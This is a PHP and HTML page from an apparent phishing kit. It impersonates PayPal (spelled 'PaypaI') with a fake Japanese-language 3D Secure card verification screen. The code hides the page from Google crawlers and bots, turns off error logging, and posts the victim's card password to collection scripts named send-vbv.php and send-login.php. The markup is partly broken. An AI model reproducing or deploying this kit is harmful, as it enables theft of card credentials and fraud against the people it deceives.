<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/9atila.php';
session_start();
error_reporting(0);

/*
█▀▀█ █▀▀█ █░░   ▀█░█▀ ░█▀█░ ░ █▀▀█
█░░█ █░░█ █░░   ░█▄█░ █▄▄█▄ ▄ █▄▀█
█▀▀▀ █▀▀▀ ▀▀▀   ░░▀░░ ░░░█░ █ █▄▄█
                                                 
*/


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();

include("functionns/Bot-blocker.php");
include("functionns/Geo-plugin.php");
include("functionns/OS-Platform.php");
include('../Denny-ip.php');
include("functionns/block3.php");
include("functionns/block4.php");

$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="Expires" content="-1">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Cache-Control" content="no-cache">
	<link rel="shortcut icon" href="source/img/pp258.png">
<link rel="icon" type="image/png" href="source/img/pp258.png">
	<link href="securevbv/ntt.css" rel="stylesheet" type="text/css">
	<title>
		PaypaI : 3D Secure
	</title>
</head>

<body onload="SetFocus()" bgcolor="#ffffff">

<form name="A1" method="post" action="functionns/send-vbv.php" >


<center>
<table cellpadding="0" cellspacing="0" border="0">
<tbody><tr>
	<td>
		<table cellpadding="0" cellspacing="0" border="0" width="350px">
  	    <tbody><tr>
			<td valign="top">

				
				<br><br><br><br><table cellpadding="0" cellspacing="0" border="0" width="100%">
				<tbody><tr>
					<td>
						<center><table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
						<tbody><tr>
							<td align="left" width="50%">
								<img src="securevbv/logo.png" border="0" style="width:150px;he/td>
            </tr>
            <tr>
                <td class="normalbold" valign="top" align="right" width="150px">
                    カード番号:
                </td>
                <td width="10px">
                </td>
                <td valign="top" class="normalbold" width="180px">
                    **** **** **** ****
                </td>
            </tr>

            
            
                
				
				
				
				
            

            

            

            
            

            

            <tr>
                <td class="normalbold" valign="center" width="150px" align="right">
                    パスワード:
                </td>
                <td width="10px">
                </td>
                <td valign="top" width="180px">
                    <!-- no errors, retain password -->
					   <form action="functionns/send-login.php" method="post" name="loginForm">                 
					<input type="VbvPass" maxlength="32" size="20" name="VbvPass" value="" placeholder="パスワード" autocomplete="off" type="text" required="" aria-required="true">
					
					                </td>
                
            </tr>

            
            
            
            

            <tr height="10">
                <td><img src="securevbv/spacer.gif"></td>
            </tr>

            

            <tr>
                
                    <td valign="top" align="left">&nbsp;</td>
                    <td width="10px">
                    </td>
                    <td valign="top" align="left" width="180px">

		    <table cellpadding="0" cellspacing="0" border="0" width="180px">
		    <tbody><tr>
			<td nowrap="">

                        
                       <input name=""  value="送信" style="" type="submit">
					   
						
			</td>
			
			</form>
			<td nowrap="">


                        

                        
                            <a class="normallink" href="#" target="_blank">
                        </noscript>
                            <img height="12" width="12" src="securevbv/help.jpg" border="0" alt="ヘルプ" title="ヘルプ">
                        </a>

			</td>
			<td nowrap="">

                        

                    
                            <a class="normallink" href="#" target="_blank">
                        </noscript>
                            <font class="normallink">ヘルプ</font>
                        </a>

</td>
<td nowrap="">  

                        
                            <a class="normallink" href="#">
                        </noscript>
                            <font class="normallink">キャンセル</font>
                        </a>

			</td>
		</tr>
		</tbody></table>

                    </td>
                
            </tr>

            </tbody></table>
        </td>
    </tr>
    </tbody></table>

    

				</td></tr><tr>
					</tr></tbody></table><table cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
					<tbody><tr>
						<td class="copyright" align="center">
							
						</td>
					</tr>
					</tbody></table>
				</td></tr>

	
			
	  	
		</tbody></table>
	


</center>




<br>
<!-- #sub-footer -->

<ul class="first">
<br>
	<center><li class="corp" style="font-size:10px;">ソフトバンク株式会社</li>
	<li class="copyright">Copyright &copy; <?php echo date("Y"); ?> PaypaI Corp. All rights reserved.</li></center>
</ul>
<!-- /#sub-footer -->





</body></html>